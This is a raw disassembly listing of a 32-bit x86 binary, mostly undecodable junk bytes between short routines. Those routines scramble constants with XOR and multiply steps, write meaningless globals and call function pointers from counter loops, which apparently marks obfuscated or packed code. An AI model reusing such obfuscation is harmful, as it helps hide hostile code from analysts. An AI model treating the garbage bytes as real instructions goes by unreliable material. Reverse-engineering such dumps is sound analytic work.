  404216:	pop    esp
  404217:	fs dec esi
  404219:	mov    dh,0xd2
  40421b:	rol    BYTE PTR [ebx-0x1b],1
  40421e:	jb     0x4041ef
  404220:	xor    ah,dl
  404222:	adc    eax,DWORD PTR [ebp+0x0]
  404225:	xor    DWORD PTR [edi],ebp
  404227:	pop    edx
  404228:	in     al,dx
  404229:	mov    esi,0x38db76ed
  40422e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40422f:	stos   BYTE PTR es:[edi],al
  404230:	sti    
  404231:	xor    BYTE PTR [edx+0x3c],dh
  404234:	mov    eax,ds:0x7d3e9357
  404239:	push   esp
  40423a:	pop    edx
  40423b:	xor    eax,0x692732e
  404240:	ins    BYTE PTR es:[edi],dx
  404241:	mov    dl,0x94
  404243:	pop    edi
  404244:	or     al,0x48
  404246:	(bad)  
  404247:	adc    edx,ebx
  404249:	jecxz  0x404219
  40424b:	leave  
  40424c:	clc    
  40424d:	jmp    0x40429f
  40424f:	cli    
  404250:	mov    edx,0xab6143ed
  404255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404256:	icebp  
  404257:	dec    eax
  404258:	mov    al,0xf2
  40425a:	jbe    0x40422c
  40425c:	cmc    
  40425d:	push   edx
  40425e:	shl    BYTE PTR [eax],cl
  404260:	push   cs
  404261:	xor    BYTE PTR ds:0xd5e1ceb5,0x75
  404268:	jae    0x4042df
  40426a:	pop    ebx
  40426b:	pop    di
  40426d:	lods   al,BYTE PTR ds:[esi]
  40426e:	in     eax,0x62
  404270:	and    BYTE PTR [esi-0x4585079c],cl
  404276:	and    DWORD PTR [esi-0x4ae751e2],esp
  40427c:	mov    al,ds:0xf7ae993
  404281:	adc    BYTE PTR [ebp+0x7e],cl
  404284:	je     0x404288
  404286:	jle    0x4042e3
  404288:	and    edx,DWORD PTR [eax+0x1a]
  40428b:	(bad)  
  40428c:	sar    BYTE PTR [ebx],1
  40428e:	mov    bl,0xad
  404290:	or     al,0x73
  404292:	xor    esp,DWORD PTR [edi+0x20]
  404295:	xlat   BYTE PTR ds:[ebx]
  404296:	xor    dl,BYTE PTR [edi]
  404298:	outs   dx,DWORD PTR ds:[esi]
  404299:	add    dl,BYTE PTR [esi-0x70]
  40429c:	jo     0x404290
  40429e:	xchg   esp,eax
  40429f:	mov    ebp,edx
  4042a1:	jnp    0x4042b6
  4042a3:	icebp  
  4042a4:	and    eax,0xf46bbc67
  4042a9:	sbb    cl,bl
  4042ab:	or     eax,DWORD PTR [eax-0x63]
  4042ae:	xchg   ebx,eax
  4042af:	sub    dl,BYTE PTR [eax-0x1b]
  4042b2:	mov    edi,0x4f7ee197
  4042b7:	jb     0x4042a2
  4042b9:	retf   0x456c
  4042bc:	out    dx,eax
  4042bd:	cmp    DWORD PTR [esi+0x37f56cf4],ebx
  4042c3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4042c5:	daa    
  4042c6:	mov    edi,0x65f641f
  4042cb:	inc    ecx
  4042cc:	retf   0x2b35
  4042cf:	pop    eax
  4042d0:	fmul   QWORD PTR [esi]
  4042d2:	out    dx,eax
  4042d3:	sbb    cl,BYTE PTR [ebx]
  4042d5:	test   al,cl
  4042d7:	ds test al,0xa5
  4042da:	cli    
  4042db:	push   ecx
  4042dc:	jo     0x404298
  4042de:	mov    ebx,gs
  4042e0:	icebp  
  4042e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e2:	xlat   BYTE PTR ds:[ebx]
  4042e3:	inc    edi
  4042e4:	ja     0x404266
  4042e6:	fimul  WORD PTR [edi+0x41]
  4042e9:	fcmovnbe st,st(7)
  4042eb:	jl     0x404363
  4042ed:	push   eax
  4042ee:	inc    edi
  4042ef:	lea    ebx,[esi+0x30]
  4042f2:	hlt    
  4042f3:	dec    ecx
  4042f4:	int3   
  4042f5:	test   BYTE PTR ss:[bp+di-0x4d],bh
  4042fa:	lahf   
  4042fb:	mov    dh,0x24
  4042fd:	mov    ch,0x94
  4042ff:	and    eax,0x46514380
  404304:	jmp    0xef969bd
  404309:	test   DWORD PTR cs:[ebx-0x3a],ebx
  40430d:	adc    BYTE PTR [ebx+0x55],bh
  404310:	and    ebx,DWORD PTR [ecx+0x9803aec]
  404316:	xor    eax,0xcb2caebd
  40431b:	aas    
  40431c:	in     eax,dx
  40431d:	mov    sp,0xbfab
  404321:	lods   al,BYTE PTR ds:[esi]
  404322:	out    dx,al
  404323:	into   
  404324:	xor    al,al
  404326:	xor    esi,edx
  404328:	ss mov bh,0xcf
  40432b:	or     BYTE PTR [eax-0x4f1b1790],dl
  404331:	xor    BYTE PTR [ecx],ch
  404333:	test   DWORD PTR [edi+0x5a0df230],ebp
  404339:	into   
  40433a:	mov    edi,0x8acf6d20
  40433f:	push   es
  404340:	sub    BYTE PTR [eax+ebx*8-0x54dbbeca],dl
  404347:	rsm    
  404349:	cmp    ecx,edi
  40434b:	dec    ebp
  40434c:	inc    BYTE PTR [edi+ecx*8]
  40434f:	iret   
  404350:	aam    0xa7
  404352:	call   DWORD PTR [eax+eax*4-0x56c91102]
  404359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40435a:	loopne 0x40435a
  40435c:	mov    edi,0x7f75a05c
  404361:	scas   eax,DWORD PTR es:[edi]
  404362:	inc    ebp
  404363:	jp     0x404316
  404365:	clc    
  404366:	shl    bl,1
  404368:	mov    esp,0x234f3a24
  40436d:	fcom   QWORD PTR [ebx-0x4e]
  404370:	idiv   DWORD PTR [eax-0x1d5901b0]
  404376:	or     dl,BYTE PTR [eax+0x768a5525]
  40437c:	stc    
  40437d:	push   ebx
  40437f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404380:	jg     0x404382
  404382:	mov    ds:0x1f875a09,eax
  404387:	inc    edi
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42edef,0x42e7c0
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ede7,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x430435,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42edef,0x430435
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x4304df,0x42e7c8
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e7cc,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ede3,0x42edeb
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42edeb,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x43044d,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	ja     0x4044a5
  40442e:	adc    esi,edi
  404430:	std    
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x40445f
  404439:	scas   al,BYTE PTR es:[edi]
  40443a:	imul   DWORD PTR [ebp+0x55]
  40443d:	(bad)  [eax+0x553dd92c]
  404443:	jnp    0x404424
  404445:	sub    BYTE PTR [edi],dl
  404447:	inc    ecx
  404448:	mov    ds:0xe963e15d,eax
  40444d:	pop    ss
  40444e:	jne    0x404492
  404450:	test   al,0xc1
  404452:	sbb    ebx,esi
  404454:	sub    eax,0x44f9ad6e
  404459:	pushf  
  40445a:	das    
  40445b:	add    DWORD PTR [esi-0x4c],esp
  40445e:	jnp    0x4044a4
  404460:	popfw  
  404462:	push   0x7511e816
  404467:	dec    edx
  404468:	add    al,BYTE PTR [ecx+ebx*2]
  40446b:	adc    al,0x59
  40446d:	les    ebp,FWORD PTR ds:0x79b1de72
  404473:	fcomp  DWORD PTR ds:0x68a98dc1
  404479:	icebp  
  40447a:	in     eax,dx
  40447b:	inc    esp
  40447c:	xor    al,0xa2
  40447e:	cmp    al,BYTE PTR [esi+0x6c]
  404481:	mov    edx,0x6c9a8710
  404486:	mov    dh,0x3b
  404488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404489:	mov    al,ds:0x5a5e6ce8
  40448e:	aaa    
  40448f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404490:	loopne 0x404419
  404492:	jmp    0x29dd:0xa4ff1929
  404499:	loopne 0x40443c
  40449b:	add    cl,ch
  40449d:	sub    ebx,DWORD PTR [edi]
  40449f:	(bad)  
  4044a0:	sahf   
  4044a1:	mov    eax,ds:0xe181fdbc
  4044a6:	dec    edi
  4044a7:	out    dx,eax
  4044a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044a9:	or     eax,0xa4875fd3
  4044ae:	add    DWORD PTR [edi],ebp
  4044b0:	sbb    eax,0xebbdc81
  4044b5:	xchg   edx,eax
  4044b6:	call   0x31f2:0xb0cbb482
  4044bd:	sbb    bl,BYTE PTR [eax+ebp*8+0x7bac273d]
  4044c4:	shl    DWORD PTR [edi-0x41],cl
  4044c7:	out    0x2e,eax
  4044c9:	popf   
  4044ca:	out    dx,al
  4044cb:	xor    ecx,DWORD PTR [eax]
  4044cd:	(bad)  
  4044cf:	inc    ecx
  4044d0:	dec    ebp
  4044d1:	adc    esp,ebx
  4044d3:	jbe    0x40447a
  4044d5:	and    ecx,edx
  4044d7:	cld    
  4044d8:	push   ds
  4044d9:	cmp    ebx,ecx
  4044db:	sub    al,0xf4
  4044dd:	sbb    BYTE PTR [edx+edx*1],0xb2
  4044e1:	pop    es
  4044e2:	inc    edx
  4044e3:	cmp    eax,0x5d2516a8
  4044e8:	push   0x7
  4044ea:	ss xchg ebx,eax
  4044ec:	add    BYTE PTR [edx+0x1103f816],bl
  4044f2:	stc    
  4044f3:	icebp  
  4044f4:	loope  0x404480
  4044f6:	in     eax,dx
  4044f7:	js     0x404502
  4044f9:	bound  esi,QWORD PTR [edi-0x18]
  4044fc:	ret    0xdad3
  4044ff:	aaa    
  404500:	loop   0x40450b
  404502:	fldln2 
  404504:	aam    0x9c
  404506:	adc    al,0xa7
  404508:	and    DWORD PTR [ecx+eax*1],0x31
  40450c:	cmp    ah,BYTE PTR [esi-0x43f6dcd9]
  404512:	push   eax
  404513:	jnp    0x4044f4
  404515:	jnp    0x4044a8
  404517:	jb     0x404598
  404519:	imul   esi,DWORD PTR [esi+0x6f7b6583],0xc1f0929d
  404523:	or     DWORD PTR [edx],edi
  404525:	hlt    
  404526:	or     BYTE PTR [ecx+ebx*4-0x60],0x36
  40452b:	sub    BYTE PTR [edi+0x6b],dl
  40452e:	adc    DWORD PTR cs:[esi+0x1b],ecx
  404532:	sub    BYTE PTR [edi+ebp*8+0xba8ee3c],dh
  404539:	dec    ecx
  40453a:	xchg   esi,eax
  40453b:	push   cs
  40453c:	dec    edi
  40453d:	mov    ds:0x5597e123,al
  404542:	out    dx,eax
  404543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404544:	into   
  404545:	dec    ebx
  404546:	je     0x4045b9
  404548:	call   0x2375:0x2c065bb
  40454f:	call   DWORD PTR [eax]
  404551:	sti    
  404552:	in     al,dx
  404553:	mov    dh,0xf1
  404555:	sub    BYTE PTR [esi+0x75],0x48
  404559:	pop    esp
  40455a:	jno    0x404561
  40455c:	cmp    DWORD PTR [edi],0x1b9bb9ec
  404562:	jg     0x404558
  404564:	mov    ch,0xc6
  404566:	xchg   edx,eax
  404567:	in     al,0x71
  404569:	pusha  
  40456a:	loop   0x404515
  40456c:	cmp    ecx,0xa0997a03
  404572:	scas   al,BYTE PTR es:[edi]
  404573:	mov    edx,0x273350aa
  404578:	jecxz  0x40452f
  40457a:	push   0xf101d14d
  40457f:	fucom  st(1)
  404581:	std    
  404582:	sub    al,0x99
  404584:	out    0xe1,eax
  404586:	pop    esi
  404587:	ins    DWORD PTR es:[edi],dx
  404588:	mov    dh,0x44
  40458a:	adc    eax,esi
  40458c:	sub    eax,0x2af6ea1b
  404591:	push   edi
  404592:	cli    
  404593:	fbstp  TBYTE PTR [eax]
  404595:	call   0x37d14bc4
  40459a:	xchg   edi,eax
  40459b:	pop    es
  40459c:	adc    dl,ch
  40459e:	mov    esi,0x67b45013
  4045a3:	sbb    ebp,DWORD PTR [edi+0x672e222c]
  4045a9:	mov    cl,0x90
  4045ab:	add    DWORD PTR gs:[edx-0x30],ebx
  4045af:	ret    
  4045b0:	daa    
  4045b1:	nop
  4045b2:	xor    BYTE PTR [ecx-0x30],dh
  4045b5:	jo     0x4045aa
  4045b7:	std    
  4045b8:	popf   
  4045b9:	push   ebx
  4045ba:	mov    DWORD PTR ds:0xdf2c7fb1,esi
  4045c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c1:	and    ch,BYTE PTR [ebx-0x2e]
  4045c4:	pop    edx
  4045c5:	sub    dh,BYTE PTR [ebx+0x142ce093]
  4045cb:	push   esi
  4045cc:	adc    BYTE PTR [ebx-0x4c],ch
  4045cf:	mov    ecx,0xf6652305
  4045d4:	dec    edi
  4045d5:	and    BYTE PTR [edx*2-0x72aca13b],bh
  4045dc:	icebp  
  4045dd:	int3   
  4045de:	xchg   esp,eax
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x4304e7,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x430439,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x430439
  40460c:	inc    eax
  40460d:	mov    ds:0x430439,eax
  404612:	cmp    DWORD PTR ds:0x430439,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x430439,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ec13
  404650:	cmp    DWORD PTR ds:0x430439,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x430439
  404662:	inc    eax
  404663:	mov    ds:0x430439,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42edd3,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x430439,0x430471
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x43045d,0x42eddb
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404722
  4046fa:	jg     0x404728
  4046fc:	out    0x24,al
  4046fe:	daa    
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x4046d3
  404706:	leave  
  404707:	push   ds
  404708:	jg     0x40468d
  40470a:	sub    cl,bh
  40470c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40470d:	out    dx,al
  40470e:	pop    edi
  40470f:	xor    al,0xf1
  404711:	repnz xor DWORD PTR [eax+0x2b],ecx
  404715:	popf   
  404716:	xchg   BYTE PTR [ebp+0x76],cl
  404719:	(bad)  
  40471a:	jp     0x4046c4
  40471c:	sti    
  40471d:	xchg   edx,eax
  40471e:	cmp    DWORD PTR [esi+eiz*4+0x31918317],edx
  404725:	outs   dx,DWORD PTR ds:[esi]
  404726:	pop    ebx
  404727:	sbb    dl,BYTE PTR [ebp+esi*8+0x40]
  40472b:	scas   al,BYTE PTR es:[edi]
  40472c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40472d:	test   BYTE PTR [edx-0x7b54503d],bl
  404733:	add    al,0x62
  404735:	sub    ecx,DWORD PTR [ecx+eiz*1-0x8]
  404739:	inc    edx
  40473a:	hlt    
  40473b:	(bad)  
  40473c:	out    dx,eax
  40473d:	loope  0x404730
  40473f:	cmc    
  404740:	add    DWORD PTR [ecx+0x13f554f5],edi
  404746:	adc    DWORD PTR [eax-0x241aacbb],ecx
  40474c:	fadd   QWORD PTR [ebx-0x79df1ca9]
  404752:	imul   eax,DWORD PTR [eax-0x1e80ae],0x6d
  404759:	call   0xf7b2:0xd567d654
  404760:	sub    ecx,DWORD PTR [ecx-0x71109347]
  404766:	adc    ah,BYTE PTR [edi+0x35]
  404769:	ja     0x4047ad
  40476b:	not    DWORD PTR [ebx-0x6ce5cad8]
  404771:	dec    ebx
  404772:	cmp    BYTE PTR [eax+0x45],bh
  404775:	add    BYTE PTR [eax],dh
  404777:	and    esi,DWORD PTR [ecx-0x12]
  40477a:	cmp    dl,0xab
  40477d:	xor    ch,BYTE PTR [ebx]
  40477f:	mov    ss,WORD PTR fs:[edx-0x53]
  404783:	popa   
  404784:	or     esp,DWORD PTR [ecx+ebp*2+0x73]
  404788:	or     al,0x53
  40478a:	dec    ecx
  40478b:	cmp    edx,edi
  40478d:	mov    ds:0xf7c50935,al
  404792:	cmp    eax,0x5650dc98
  404797:	xchg   ebx,eax
  404798:	outs   dx,BYTE PTR ds:[esi]
  404799:	adc    esp,esi
  40479b:	out    0x48,eax
  40479d:	sbb    eax,0x8781b829
  4047a2:	clc    
  4047a3:	sahf   
  4047a4:	ss repz (bad) 
  4047a7:	mov    al,ds:0xbb2c0b82
  4047ac:	or     al,0x6e
  4047ae:	or     ebp,DWORD PTR [esi-0x10]
  4047b1:	and    al,0x7a
  4047b3:	xchg   edx,eax
  4047b4:	mov    eax,0xc62cd03f
  4047b9:	int3   
  4047ba:	dec    edi
  4047bb:	ror    BYTE PTR [edx+0x3f71cc67],cl
  4047c1:	sahf   
  4047c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047c3:	mov    cl,0xcb
  4047c5:	mov    esp,0x96a9ec2
  4047ca:	and    eax,0x26548a35
  4047cf:	fisubr DWORD PTR [esi]
  4047d1:	test   DWORD PTR [ebp+0x7e61fff],0x8948876e
  4047db:	jge    0x404840
  4047dd:	popf   
  4047de:	push   ecx
  4047df:	std    
  4047e0:	inc    ebp
  4047e1:	imul   eax,ecx,0xb9a7161c
  4047e7:	or     bh,bl
  4047e9:	inc    esp
  4047ea:	(bad)  [edx+0x32]
  4047ed:	mov    edx,0x2099e377
  4047f2:	jecxz  0x404828
  4047f4:	(bad)  
  4047f5:	jmp    0x53d3:0x854d4b39
  4047fc:	hlt    
  4047fd:	and    ebp,DWORD PTR [ebx]
  4047ff:	arpl   WORD PTR [esi-0x78016f51],ax
  404805:	push   edi
  404806:	adc    BYTE PTR [ecx+0x58be9488],bl
  40480c:	pop    edi
  40480d:	push   es
  40480e:	loop   0x40487b
  404810:	daa    
  404811:	shl    DWORD PTR [edi],0x43
  404814:	in     al,dx
  404815:	xor    al,BYTE PTR [ecx+0x52e679e]
  40481b:	retf   0x8db7
  40481e:	int3   
  40481f:	fisubr WORD PTR [edx+0x42e691ca]
  404825:	(bad)  
  404826:	sti    
  404827:	mov    ah,0x79
  404829:	or     eax,DWORD PTR [edi+0x61]
  40482c:	mov    edi,0x9bbca83f
  404831:	mov    eax,ds:0x37728ebf
  404836:	mov    ah,cl
  404838:	inc    esi
  404839:	and    BYTE PTR [eax+0x72],dl
  40483c:	loope  0x404855
  40483e:	pop    ss
  40483f:	inc    esp
  404840:	into   
  404841:	dec    ecx
  404842:	mov    ecx,DWORD PTR ds:0xe5bf0f4e
  404848:	pop    edi
  404849:	in     al,0x9d
  40484b:	sar    BYTE PTR [ecx+0x67],0x66
  40484f:	mov    dl,0x56
  404851:	loopne 0x404890
  404853:	push   esp
  404854:	in     eax,0x5
  404856:	ds (bad) 
  404859:	faddp  st(1),st
  40485b:	lods   eax,DWORD PTR ds:[esi]
  40485c:	pop    es
  40485d:	test   eax,0xe0874c67
  404862:	xchg   ebp,eax
  404863:	cs pop edx
  404865:	frstor [esi-0x1c]
  404868:	or     BYTE PTR [esi+ebp*8],dh
  40486b:	push   edx
  40486c:	mov    ch,0x4e
  40486e:	xchg   ebp,eax
  40486f:	xor    dh,al
  404871:	into   
  404872:	or     al,0x67
  404874:	jne    0x4048c1
  404876:	jmp    0x4048d9
  404878:	inc    esp
  404879:	leave  
  40487a:	mov    cl,0x22
  40487c:	lock jnp 0x4048fc
  40487f:	leave  
  404880:	out    0x65,al
  404882:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404884:	push   0x7ecce7e
  404889:	xchg   ecx,eax
  40488a:	ret    0xae82
  40488d:	cmp    edx,DWORD PTR [eax+0x4e]
  404890:	data16 int3 
  404892:	out    dx,al
  404893:	adc    BYTE PTR ds:0xb1f637fc,cl
  404899:	scas   al,BYTE PTR es:[edi]
  40489a:	add    eax,eax
  40489c:	mov    BYTE PTR [eax+ebp*8+0x14],ch
  4048a0:	jmp    0x37fa:0x7698ff50
  4048a7:	outs   dx,BYTE PTR ds:[esi]
  4048a8:	bnd je 0x404922
  4048ab:	pop    esp
  4048ac:	sub    eax,0xb2b37ff6
  4048b1:	repz push edx
  4048b3:	pop    ecx
  4048b4:	lds    edi,FWORD PTR [edi-0xc21a2f6]
  4048ba:	std    
  4048bb:	ret    
  4048bc:	dec    eax
  4048bd:	fmul   st(7),st
  4048bf:	ss lahf 
  4048c1:	xor    cl,BYTE PTR [edx+0x23ca42c3]
  4048c7:	push   eax
  4048c8:	(bad)  
  4048c9:	sub    DWORD PTR [edx],ebp
  4048cb:	push   esp
  4048cc:	jg     0x404932
  4048ce:	arpl   WORD PTR [eax+0x1800f84e],ax
  4048d4:	add    DWORD PTR [ecx-0x75],esp
  4048d7:	push   ss
  4048d8:	inc    edi
  4048d9:	popa   
  4048da:	mov    ds:0x7ed782d1,eax
  4048df:	sbb    esi,DWORD PTR [ecx-0x46cda5bf]
  4048e5:	inc    ebp
  4048e6:	mov    WORD PTR [esi-0x245a2578],ss
  4048ec:	(bad)  
  4048ed:	fnstenv [ecx+0x536e8ec8]
  4048f3:	xchg   dl,cl
  4048f5:	inc    eax
  4048f6:	leave  
  4048f7:	inc    DWORD PTR [eax]
  4048f9:	and    al,BYTE PTR [ecx+ecx*4+0x42]
  4048fd:	mov    bh,0x16
  4048ff:	cmc    
  404900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404901:	inc    edx
  404902:	pop    eax
  404903:	rcr    BYTE PTR [edx+0x8267f97],0x91
  40490a:	fist   WORD PTR ds:[edi+0xa]
  40490e:	test   BYTE PTR [ebx],0x68
  404911:	jmp    0xc005:0x4b06508d
  404918:	sti    
  404919:	outs   dx,BYTE PTR ds:[esi]
  40491a:	shl    BYTE PTR [eax],0xd5
  40491d:	std    
  40491e:	adc    BYTE PTR [edx+0x77],bh
  404921:	loop   0x4048aa
  404923:	shl    DWORD PTR [esp+ebx*8-0x23],1
  404927:	es push ecx
  404929:	lahf   
  40492a:	cs jge 0x404988
  40492d:	pop    ebx
  40492e:	jns    0x404954
  404930:	mov    eax,ds:0x703e4650
  404935:	sbb    al,0x70
  404937:	pop    ebx
  404938:	pop    edi
  404939:	add    eax,0x159ccc23
  40493e:	loopne 0x4048f2
  404940:	mov    DWORD PTR [edi-0x5],ebp
  404943:	ds cmp eax,0x5c3ae5a4
  404949:	and    eax,0xc651c171
  40494e:	pop    esi
  40494f:	add    DWORD PTR [ecx-0x3a],0x4d59464e
  404956:	popf   
  404957:	push   0x567eeae8
  40495c:	inc    ecx
  40495d:	mov    cl,0x15
  40495f:	cmp    BYTE PTR cs:[edx],bh
  404962:	push   ss
  404963:	fmul   DWORD PTR [ecx+0x4e15397d]
  404969:	cwde   
  40496a:	gs push ecx
  40496c:	rcr    BYTE PTR [ebx],0x24
  40496f:	adc    DWORD PTR [edx],edi
  404971:	inc    ebx
  404972:	clc    
  404973:	mov    eax,DWORD PTR [eax]
  404975:	icebp  
  404976:	mov    al,ds:0xef1ba3b1
  40497b:	mov    bh,0x45
  40497d:	cmp    ah,BYTE PTR [edi+ebp*8]
  404980:	(bad)  
  404981:	aad    0xf6
  404983:	repz cwde 
  404985:	pop    es
  404986:	xchg   edx,eax
  404987:	inc    ebx
  404988:	lods   eax,DWORD PTR ds:[esi]
  404989:	inc    esi
  40498a:	xchg   ebp,eax
  40498b:	jmp    0xb693:0x61f33d07
  404992:	sub    al,0x9e
  404994:	int    0x19
  404996:	jns    0x40494c
  404998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404999:	xor    bl,BYTE PTR [edx+0x7b]
  40499c:	add    esp,DWORD PTR [eax-0x152c6793]
  4049a2:	pop    esp
  4049a3:	pop    es
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e7d8,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e7d8
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e7d8,edx
  4049bf:	cmp    DWORD PTR ds:0x42e7d8,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e9cf
  4049da:	cmp    DWORD PTR ds:0x42e7d8,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e7d8
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e7d8,edx
  4049f4:	cmp    DWORD PTR ds:0x42e7d8,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42edeb,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x4304cf,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ede7,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x4304e3,0x4304df
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ede7,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x4304db
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	gs mov ebx,0x2547d505
  404a91:	jle    0x404b11
  404a93:	xchg   ecx,eax
  404a94:	jl     0x404b14
  404a96:	jle    0x404ae6
  404a98:	std    
  404a99:	sbb    DWORD PTR [edi+0x65450fc7],ebp
